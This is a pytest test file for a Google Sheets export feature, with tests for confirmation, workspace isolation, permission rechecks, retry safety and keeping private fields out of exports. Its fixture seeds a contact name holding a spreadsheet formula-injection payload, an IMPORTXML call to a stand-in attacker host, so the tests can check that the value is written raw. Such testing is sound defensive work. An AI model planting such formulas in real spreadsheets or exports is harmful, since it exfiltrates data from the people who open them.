from __future__ import annotations

import asyncio
import json
from contextlib import contextmanager
from datetime import timedelta

import pytest
from fastapi.testclient import TestClient

from tests.company_os_harness import load_company_os_app


@pytest.fixture(params=[("Freight records", "Customs brokers compare shipment records"),
    ("Walking groups", "Families arrange weekend walks")], ids=["business", "consumer"])
def export_env(request, tmp_path, monkeypatch):
    monkeypatch.delenv("SUPYMEM_MODE", raising=False)
    monkeypatch.setenv("COMPANY_OS_DB_URL", f"sqlite:///{tmp_path}/export.db")
    monkeypatch.setenv("COMPANY_OS_DATA_DIR", str(tmp_path))
    monkeypatch.setenv("COMPANY_OS_WORKING_MEMORY_PATH", str(tmp_path / "memory.db"))
    monkeypatch.setenv("COMPANY_OS_MEMORY_PATH", str(tmp_path / "mem.sqlite3"))
    monkeypatch.setenv("COMPANY_OS_BRAIN_GRAPH_PATH", str(tmp_path / "graph.sqlite3"))
    monkeypatch.setenv("ONBOARDING_SYNC", "0")
    main = load_company_os_app()
    from app import state
    from app.authz.workspace import ensure_subject_person
    from app.connections import sheets_export
    from app.credits.accounts import ensure_account
    from app.credits.policy import set_policy
    from app.db.models import ContentOAuthState, GtmCompany, GtmContact, Venture
    from app.db.supymem_models import Experiment
    from app.tenancy import bind
    from app.workspaces.service import create_workspace
    from core.clock import utcnow

    state.reset_db_factory()
    state.MEM.clear()
    actor = ensure_subject_person("usr_sheet_owner")
    workspace = create_workspace(kind="company", name=request.param[0], owner_id=actor)
    now = utcnow()
    with state.db()() as session:
        session.add(Venture(id="ven_sheet", workspace_id=workspace.id, name=request.param[0],
            raw_idea=request.param[1], stage="draft", created_at=now, updated_at=now))
        session.add(ContentOAuthState(id="owned_connection", workspace_id=workspace.id, platform="googlesheets",
            actor_subject=actor, auth_method="composio", provider_user_id=f"content:{workspace.id}",
            auth_config_id="ac_fixture", connected_account_id="ca_owned", outcome="connected",
            redirect_uri="https://fixture.example/callback", consumed_at=now, expires_at=now, created_at=now))
        context = {"spec": {"name": request.param[0], "metric": "bookings", "success_threshold": {
            "op": ">=", "value": 3, "min_events": 5}}, "result": {"measured": {"bookings": 4}, "outcome": "supported"},
            "private_notes": "DO_NOT_EXPORT"}
        session.add(Experiment(id="exp_owned", workspace_id=workspace.id, venture_id="ven_sheet", kind="venture_test",
            hypothesis=request.param[1], metric="bookings", state="concluded", started_at=now - timedelta(days=2),
            ended_at=now, outcome="supported", context=json.dumps(context), notes="DO_NOT_EXPORT"))
        session.add(Experiment(id="exp_wrong_workspace", workspace_id="wsp_other", venture_id="ven_sheet",
            kind="venture_test", hypothesis="FOREIGN_RESULT"))
        session.add(GtmCompany(id="co_owned", workspace_id=workspace.id, canonical_name=request.param[0],
            notes="DO_NOT_EXPORT", created_at=now))
        for contact_id, source, wid in (("lead_owned", "venture:ven_sheet:public", workspace.id),
                ("lead_other_venture", "venture:ven_other:public", workspace.id),
                ("lead_like_wildcard", "venture:venXsheet:public", workspace.id),
                ("lead_foreign", "venture:ven_sheet:public", "wsp_other")):
            session.add(GtmContact(id=contact_id, workspace_id=wid, company_id="co_owned",
                first_name="=IMPORTXML(\"https://evil.example\",\"//secret\")" if contact_id == "lead_owned" else "FOREIGN_LEAD",
                last_name="Reader", role="Coordinator", source=source, email=f"DO_NOT_EXPORT_{contact_id}@fixture.example",
                enrichment_json=json.dumps({"found_at": "https://fixture.example/team", "notes": "DO_NOT_EXPORT"}),
                dossier_json='{"notes":"DO_NOT_EXPORT"}', relationship_stage="interested", stage_changed_at=now, created_at=now))
        session.commit()
    ensure_account("ven_sheet", workspace_id=workspace.id, owner_person_id=actor)
    set_policy("feature_flags", {"experiments_autopilot_v1": True}, "test")
    calls, charges = [], []
    original_charge = sheets_export.metered.charge_sync

    @contextmanager
    def charge(**kwargs):
        charges.append(kwargs)
        with original_charge(**kwargs) as meter:
            yield meter

    def provider(method, path, **kwargs):
        calls.append((method, path, kwargs))
        if path == "/tools":
            return {"items": [{"slug": sheets_export.CREATE}, {"slug": sheets_export.UPDATE}]}
        if path == f"/tools/{sheets_export.CREATE}":
            return {"input_parameters": {"properties": {"title": {}}, "required": ["title"]}}
        if path == f"/tools/{sheets_export.UPDATE}":
            return {"input_parameters": {"properties": {"spreadsheet_id": {}, "requests": {}},
                "required": ["spreadsheet_id", "requests"]}}
        if path == f"/tools/execute/{sheets_export.CREATE}":
            return {"successful": True, "data": {"spreadsheetId": "created_sheet",
                "spreadsheetUrl": "https://evil.example", "sheets": [{"properties": {"sheetId": 7}}]}}
        if path == f"/tools/execute/{sheets_export.UPDATE}":
            return {"successful": True, "data": {}}
        raise AssertionError(f"Unexpected provider call: {method} {path}")

    monkeypatch.setattr(sheets_export.metered, "charge_sync", charge)
    monkeypatch.setattr(sheets_export.composio_gmail, "_request", provider)
    with bind(workspace_id=workspace.id, venture_id="ven_sheet", actor=actor):
        yield {"vid": "ven_sheet", "wid": workspace.id, "actor": actor, "calls": calls, "charges": charges,
            "client": TestClient(main.create_app()), "hypothesis": request.param[1], "provider": provider}
    set_policy("feature_flags", {}, "test")


@pytest.mark.parametrize("revoke_after_create", [False, True])
def test_local_requested_export_runs_without_confirmation_and_keeps_revocation_and_retry_safety(export_env, monkeypatch, revoke_after_create):
    from app.chat.execute import execute_action
    from app.connections import sheets_export
    from app.core.local_secrets import update_settings
    from app.credits.policy import set_policy
    from app.db.models import ContentOAuthState, VentureDocument
    from app.state import db
    from sqlalchemy import select

    monkeypatch.setenv("SUPYMEM_MODE", "local")
    update_settings("composio", {"auth_configs": {"googlesheets": "ac_fixture"}}, {"api_key": "saved-test-key"})
    update_settings("capabilities", {"connected_apps": True}, {})
    set_policy("feature_flags", {}, "test")

    def provider(method, path, **kwargs):
        result = export_env["provider"](method, path, **kwargs)
        if revoke_after_create and path == f"/tools/execute/{sheets_export.CREATE}":
            with db()() as session:
                session.get(ContentOAuthState, "owned_connection").outcome = "revoked"
                session.commit()
        return result

    monkeypatch.setattr(sheets_export.composio_gmail, "_request", provider)
    reply = asyncio.run(execute_action(export_env["vid"], "experiment.export_sheet",
        payload={"include_leads": True}, actor_subject=export_env["actor"], founder_initiated=True))
    assert reply["kind"] == ("needs_you" if revoke_after_create else "text")
    assert "created_sheet/edit" in reply["body_md"]
    writes = [call for call in export_env["calls"] if "/execute/" in call[1]]
    assert len(writes) == (1 if revoke_after_create else 2)
    assert "DO_NOT_EXPORT" not in json.dumps(writes) and "FOREIGN" not in json.dumps(writes)
    if not revoke_after_create:
        with db()() as session:
            document = session.scalar(select(VentureDocument).where(VentureDocument.kind == sheets_export.KIND))
            export_id = document.id
        assert sheets_export.export(export_env["vid"], {"export_id": export_id}, export_env["actor"])["kind"] == "text"
        assert len([call for call in export_env["calls"] if "/execute/" in call[1]]) == 2


def _prepare(env, **payload):
    from app.chat.execute import execute_action
    from app.chat.store import append_message

    reply = asyncio.run(execute_action(env["vid"], "experiment.export_sheet", payload=payload, actor_subject=env["actor"]))
    assert reply["kind"] == "confirmation" and env["calls"] == []
    message = append_message(env["vid"], role="assistant", kind=reply["kind"], body_md=reply["body_md"], actions=reply["actions"])
    return {"action": "experiment.export_sheet", "message_id": message["id"],
        "payload": reply["actions"][0]["confirmation"]["resulting_state"]}


def _confirm(env, body):
    response = env["client"].post(f"/ventures/{env['vid']}/chat/confirm", json={**body, "idempotency_key": "browser_card_click"},
        headers={"X-Subject": env["actor"]})
    assert response.status_code == 200, response.text
    return response.json()


@pytest.mark.parametrize("include_leads", [False, True])
@pytest.mark.parametrize("tool_schema", ["cells", "raw_values"])
def test_confirmed_export_writes_only_new_sheet_and_safe_snapshot(export_env, include_leads, tool_schema, monkeypatch):
    from app.analytics.feature_catalog import ACTION_SLUG
    from app.chat.actions import get_action
    from app.connections import sheets_export

    env = export_env
    if tool_schema == "raw_values":
        def provider(method, path, **kwargs):
            if path == f"/tools/{sheets_export.CREATE}":
                env["calls"].append((method, path, kwargs))
                return {"input_parameters": {"properties": {"title": {}, "sheet_name": {}}, "required": ["title"]}}
            if path == f"/tools/{sheets_export.UPDATE}":
                env["calls"].append((method, path, kwargs))
                return {"input_parameters": {"properties": {key: {} for key in (
                    "spreadsheet_id", "sheet_name", "values", "value_input_option", "first_cell_location")},
                    "required": ["spreadsheet_id", "sheet_name", "values", "value_input_option"]}}
            result = env["provider"](method, path, **kwargs)
            if path == f"/tools/execute/{sheets_export.CREATE}":
                assert kwargs["json"]["arguments"]["sheet_name"] == "Results"
                return {"successful": True, "data": {"spreadsheet_id": "created_sheet", "sheet_name": "Results"}}
            return result
        monkeypatch.setattr(sheets_export.composio_gmail, "_request", provider)
    assert get_action("experiment.export_sheet").consequential
    assert ACTION_SLUG["experiment.export_sheet"] == "experiments"
    body = _prepare(env, include_leads=include_leads)
    reply = _confirm(env, body)
    assert reply["kind"] == "text" and "created_sheet/edit" in reply["body_md"], (reply, env["calls"], env["charges"])
    writes = [call for call in env["calls"] if "/execute/" in call[1]]
    assert len(writes) == 2
    assert writes[0][2]["json"]["user_id"] == f"content:{env['wid']}"
    assert all(call[2]["json"]["connected_account_id"] == "ca_owned" for call in writes)
    arguments = writes[1][2]["json"]["arguments"]
    assert arguments["spreadsheet_id"] == "created_sheet"
    if tool_schema == "raw_values":
        assert arguments["sheet_name"] == "Results" and arguments["first_cell_location"] == "A1"
        assert arguments["value_input_option"] == "RAW"
        cells = arguments["values"]
    else:
        update = arguments["requests"][1]["updateCells"]
        assert update["start"]["sheetId"] == 7
        cells = [[cell["userEnteredValue"]["stringValue"] for cell in row["values"]] for row in update["rows"]]
    assert cells[1][1:6] == [env["hypothesis"], "bookings", "4", "Works: >= 3 with at least 5 events", "Worked"]
    assert all(cells[1][index] for index in (6, 7))
    assert len(cells) == (6 if include_leads else 2)
    if include_leads:
        assert cells[-1][0].startswith("=IMPORTXML") and cells[-1][-1] == "interested"
        assert cells[-1][3] == "https://fixture.example/team"
    text = json.dumps(arguments)
    assert "DO_NOT_EXPORT" not in text and "FOREIGN" not in text
    assert all(charge["workspace_id"] == env["wid"] and charge["purpose"] == "experiment.export_sheet"
        and charge["provider"] == "composio" and charge["venture_id"] == env["vid"] for charge in env["charges"])
    assert len(env["charges"]) == len(env["calls"]) == 5
    assert _confirm(env, body)["id"] == reply["id"]
    assert len(env["calls"]) == 5


def test_export_expands_only_its_new_sheet_for_large_snapshots(export_env):
    from app.db.supymem_models import Experiment
    from app.state import db

    env = export_env
    with db()() as session:
        session.add_all([Experiment(id=f"exp_extra_{index}", workspace_id=env["wid"], venture_id=env["vid"],
            kind="venture_test", hypothesis=env["hypothesis"]) for index in range(1000)])
        session.commit()
    body = _prepare(env)
    assert _confirm(env, body)["kind"] == "text"
    arguments = env["calls"][-1][2]["json"]["arguments"]
    assert arguments["spreadsheet_id"] == "created_sheet"
    properties = arguments["requests"][0]["updateSheetProperties"]["properties"]
    assert properties == {"sheetId": 7, "gridProperties": {"rowCount": 1002, "columnCount": 8}}
    assert len(arguments["requests"][1]["updateCells"]["rows"]) == 1002


def test_export_keeps_older_venture_results_without_workspace_stamps(export_env):
    from app.db.supymem_models import Experiment
    from app.state import db

    env = export_env
    with db()() as session:
        session.add(Experiment(id="exp_legacy", venture_id=env["vid"], kind="venture_test",
            hypothesis=env["hypothesis"], metric="site_visits", result=12, outcome="inconclusive"))
        session.commit()
    body = _prepare(env)
    assert _confirm(env, body)["kind"] == "text"
    update = env["calls"][-1][2]["json"]["arguments"]["requests"][1]["updateCells"]
    cells = [[cell["userEnteredValue"]["stringValue"] for cell in row["values"]] for row in update["rows"]]
    assert len(cells) == 3
    legacy = next(row for row in cells if row[2] == "site visits")
    assert legacy[1] == env["hypothesis"] and legacy[3:6] == ["12.0", "", "Too early to tell"]
    assert "FOREIGN_RESULT" not in json.dumps(cells)


def test_export_flag_and_owned_connection_are_required(export_env):
    from app.chat.execute import execute_action
    from app.connections import sheets_export
    from app.credits.policy import set_policy
    from app.db.models import ContentOAuthState
    from app.state import db

    env = export_env
    for flags in ({}, {"experiments_autopilot_v1": False}, {"experiments_autopilot_v1": "true"}):
        set_policy("feature_flags", flags, "test")
        assert asyncio.run(execute_action(env["vid"], sheets_export.ACTION, actor_subject=env["actor"]))["kind"] == "needs_you"
    set_policy("feature_flags", {"experiments_autopilot_v1": True}, "test")
    for field, value in (("outcome", "revoked"), ("actor_subject", "usr_other"), ("provider_user_id", "content:wsp_other")):
        with db()() as session:
            account = session.get(ContentOAuthState, "owned_connection")
            original = getattr(account, field)
            setattr(account, field, value)
            session.commit()
        reply = asyncio.run(execute_action(env["vid"], sheets_export.ACTION, actor_subject=env["actor"]))
        assert [action["label"] for action in reply["actions"]] == ["Connect Google Sheets"]
        with db()() as session:
            setattr(session.get(ContentOAuthState, "owned_connection"), field, original)
            session.commit()
    assert env["calls"] == []


def test_export_rejects_unsigned_tampered_and_existing_sheet_requests(export_env):
    from app.chat.execute import execute_action

    env = export_env
    body = _prepare(env)
    with pytest.raises(ValueError, match="exact confirmation"):
        asyncio.run(execute_action(env["vid"], body["action"], payload=body["payload"], actor_subject=env["actor"],
            request_nonce="pretend_confirmed"))
    changed = {**body, "payload": {"export_id": "foreign_export"}}
    response = env["client"].post(f"/ventures/{env['vid']}/chat/confirm", json=changed, headers={"X-Subject": env["actor"]})
    assert response.status_code == 409
    for payload in ({"spreadsheet_id": "existing_sheet"}, {"include_leads": "true"}, {"confirmed": True}):
        with pytest.raises(ValueError):
            asyncio.run(execute_action(env["vid"], body["action"], payload=payload, actor_subject=env["actor"]))
    assert env["calls"] == []


@pytest.mark.parametrize("failure", ["create_timeout", "update_failure", "bad_id", "unsupported_schema", "auth_expired"])
def test_interrupted_exports_are_not_repeated_and_keep_new_sheet_link(export_env, monkeypatch, failure):
    from app.connections import sheets_export

    env = export_env
    body = _prepare(env)
    def provider(method, path, **kwargs):
        if failure == "auth_expired" and path == f"/tools/execute/{sheets_export.CREATE}":
            env["calls"].append((method, path, kwargs))
            return {"successful": False, "error": "invalid_grant: token expired"}
        if failure == "unsupported_schema" and path == f"/tools/{sheets_export.UPDATE}":
            env["calls"].append((method, path, kwargs))
            return {"input_parameters": {"properties": {"unknown": {}}, "required": ["unknown"]}}
        if path == f"/tools/execute/{sheets_export.CREATE}" and failure in {"create_timeout", "bad_id"}:
            env["calls"].append((method, path, kwargs))
            if failure == "create_timeout":
                raise TimeoutError("Secret provider details")
            return {"successful": True, "data": {"spreadsheetId": "bad/id"}}
        if failure == "update_failure" and path == f"/tools/execute/{sheets_export.UPDATE}":
            env["calls"].append((method, path, kwargs))
            return {"successful": False, "error": "Secret provider details"}
        return env["provider"](method, path, **kwargs)
    monkeypatch.setattr(sheets_export.composio_gmail, "_request", provider)
    reply = _confirm(env, body)
    assert reply["kind"] == "needs_you" and "Secret provider details" not in reply["body_md"]
    assert bool(reply["actions"]) == (failure in {"update_failure", "auth_expired"})
    if failure == "auth_expired":
        assert [action["label"] for action in reply["actions"]] == ["Connect Google Sheets"]
        assert reply["actions"][0]["payload"]["query"] == "reconnect Google Sheets"
    writes = [call for call in env["calls"] if "/execute/" in call[1]]
    assert len(writes) == (0 if failure == "unsupported_schema" else 2 if failure == "update_failure" else 1)
    count = len(env["calls"])
    _confirm(env, body)
    assert len(env["calls"]) == count


@pytest.mark.parametrize("change", ["flag", "connection"])
def test_export_rechecks_permission_before_each_write(export_env, monkeypatch, change):
    from app.connections import sheets_export
    from app.credits.policy import set_policy
    from app.db.models import ContentOAuthState
    from app.state import db

    env = export_env
    body = _prepare(env)
    def provider(method, path, **kwargs):
        result = env["provider"](method, path, **kwargs)
        if path == f"/tools/execute/{sheets_export.CREATE}":
            if change == "flag":
                set_policy("feature_flags", {}, "test")
            else:
                with db()() as session:
                    session.get(ContentOAuthState, "owned_connection").outcome = "revoked"
                    session.commit()
        return result
    monkeypatch.setattr(sheets_export.composio_gmail, "_request", provider)
    reply = _confirm(env, body)
    assert reply["kind"] == "needs_you" and "created_sheet/edit" in reply["body_md"]
    assert len([call for call in env["calls"] if "/execute/" in call[1]]) == 1
